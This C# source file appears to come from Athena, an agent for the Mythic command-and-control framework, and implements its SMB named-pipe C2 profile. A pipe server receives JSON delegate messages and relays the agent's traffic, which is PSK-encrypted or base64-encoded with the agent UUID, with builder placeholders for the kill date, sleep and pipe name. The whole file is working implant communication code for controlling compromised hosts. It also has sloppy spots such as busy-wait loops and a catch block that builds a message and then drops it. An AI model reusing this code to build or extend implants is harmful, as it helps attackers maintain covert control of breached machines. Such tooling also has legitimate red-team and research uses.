﻿using Athena.Models.Mythic.Response;
using Athena.Utilities;
using Athena.Models.Athena.Pipes;
using Newtonsoft.Json;
using System;
using System.Collections.Concurrent;
using System.IO.Pipes;
using System.Threading.Tasks;

namespace Athena.Config
{
    public class ServerPipe : BasicPipe
    {
        public event EventHandler<EventArgs> Connected;

        protected NamedPipeServerStream serverPipeStream;
        protected string PipeName { get; set; }

        public ServerPipe(string pipeName, Action<BasicPipe> asyncReaderStart)
        {
            this.asyncReaderStart = asyncReaderStart;
            PipeName = pipeName;

            serverPipeStream = new NamedPipeServerStream(
                pipeName,
                PipeDirection.InOut,
                NamedPipeServerStream.MaxAllowedServerInstances,
                PipeTransmissionMode.Message,
                PipeOptions.Asynchronous);

            pipeStream = serverPipeStream;
            serverPipeStream.BeginWaitForConnection(new AsyncCallback(PipeConnected), null);
        }

        protected void PipeConnected(IAsyncResult ar)
        {
            serverPipeStream.EndWaitForConnection(ar);
            Connected?.Invoke(this, new EventArgs());
            asyncReaderStart(this);
        }
    }
    public class MythicConfig
    {
        public Smb currentConfig { get; set; }
        public string uuid { get; set; }
        public DateTime killDate { get; set; }
        public int sleep { get; set; }
        public int jitter { get; set; }
        public SMBForwarder smbForwarder { get; set; }

        public MythicConfig()
        {
            this.uuid = "%UUID%";
            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
            this.killDate = kd;
            int sleep = 1;
            this.sleep = sleep;
            int jitter = 0;
            this.jitter = jitter;
            this.currentConfig = new Smb(this.uuid, this);
            this.smbForwarder = new SMBForwarder();
        }
    }

    public class Smb
    {
        public string psk { get; set; }
        private ServerPipe serverPipe { get; set; }
        public string pipeName = "pipe_name"; //Will need to handle this in the builder.py 
        private bool connected { get; set; }
        public bool encrypted { get; set; }
        public bool encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
        public PSKCrypto crypt { get; set; }
        public ConcurrentQueue<DelegateMessage> queueIn { get; set; }

        public Smb(string uuid, MythicConfig config)
        {
            this.connected = false;
            this.psk = "";
            this.queueIn = new ConcurrentQueue<DelegateMessage>();
            if (!string.IsNullOrEmpty(this.psk))
            {
                this.crypt = new PSKCrypto(uuid, this.psk);
                this.encrypted = true;
            }
            this.serverPipe = CreateServer();
        }

        private ServerPipe CreateServer()
        {
            ServerPipe serverPipe = new ServerPipe(this.pipeName, p => p.StartStringReaderAsync());
            serverPipe.DataReceived += (sndr, args) =>
                    Task.Run(() =>
                    {
                        DoDataReceived(args.String);
                    });

            serverPipe.Connected += (sndr, args) =>
                Task.Run(() =>
                {
                    this.connected = true;
                });
            serverPipe.PipeClosed += (sendr, args) =>
                Task.Run(() =>
                {
                    this.connected = false;
                    this.serverPipe = CreateServer();
                });
            return serverPipe;
        }

        private void DoDataReceived(string msg)
        {
            try
            {
                DelegateMessage dm = JsonConvert.DeserializeObject<DelegateMessage>(msg);

                //Add message to out queue.
                this.queueIn.Enqueue(dm);
            }
            catch
            {
                DelegateMessage dm = new DelegateMessage()
                {
                    c2_profile = "smb",
                    uuid = "",
                    message = ""
                };
            }
        }
        //Send, wait for a response, and return it to the main functions
        public async Task<string> Send(object obj)
        {
            //Wait for connection to become available
            while (!connected) { };

            try
            {
                string json = JsonConvert.SerializeObject(obj);
                if (this.encrypted)
                {
                    json = this.crypt.Encrypt(json);
                }
                else
                {
                    json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                }

                //Submit our message to the mythic server and wait for a response
                DelegateMessage dm = new DelegateMessage()
                {
                    uuid = Globals.mc.MythicConfig.uuid,
                    message = json,
                    c2_profile = "smb"
                };

                _ = this.serverPipe.WriteString(JsonConvert.SerializeObject(dm));

                DelegateMessage res = new DelegateMessage();

                while (!this.queueIn.TryDequeue(out dm)) {
                    if (!this.connected)
                    {
                        return "";
                    }
                };

                //Decrypt and return
                if (this.encrypted)
                {
                    return this.crypt.Decrypt(dm.message);
                }
                else
                {
                    return Misc.Base64Decode(dm.message).Substring(36);
                }
            }
            catch
            {
                this.connected = false;
                return "";
            }
        }
    }
}
